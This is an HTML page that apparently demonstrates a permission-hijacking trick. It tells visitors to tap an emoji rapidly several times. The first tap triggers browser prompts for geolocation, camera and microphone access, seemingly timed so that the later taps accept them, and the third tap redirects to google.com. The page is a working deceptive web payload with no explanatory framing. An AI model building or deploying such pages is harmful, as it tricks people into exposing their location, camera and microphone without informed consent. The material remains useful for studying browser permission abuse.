<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Emoji Click Redirect</title>
  <style>
    html {
      font-family: sans-serif;
      width: 100vw;
      height: 100vh;
      background: #eee;
    }
    h3#emoji {
      margin-top: -20px;  /* Moves the emoji slightly higher */
      font-size: 30px;
    }
    .cursor128 { cursor: url('cursor-128x128.png') 128 128, auto; }
  </style>
</head>
<body>
  <h1>Filler</h1>
  <h2>Filler</h2>
  <h2>Fast Tap (tap on trackpad on your MacBook) on the emoji 3-4 times  --> </h2>
  <h3 id="emoji">‚è©</h3>

  <script>
    let clickCount = 0;
    const emojiElement = document.getElementById('emoji');

    // Listen for click events only on the emoji
    emojiElement.addEventListener('click', function() {
      clickCount++;

      // Trigger geolocation, camera, and microphone permission request on the first click
      if (clickCount === 1) {
        // Request geolocation permission
        navigator.geolocation.getCurrentPosition(
          function(position) {
            console.log('Location granted:', position.coords.latitude, position.coords.longitude);
          },
          function(error) {
            console.error('Geolocation error:', error);
          }
        );

        // Request camera and microphone permissions
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
          .then(function(stream) {
            console.log('Camera and microphone access granted');
            // Optionally, you can display the stream (e.g., show the camera feed)
          })
          .catch(function(error) {
            console.error('Camera or microphone error:', error);
          });
      }

      // Redirect after the second click on the emoji
      if (clickCount === 3) {
        window.location.href = 'https://www.google.com';
      }
    });
  </script>
</body>
</html>
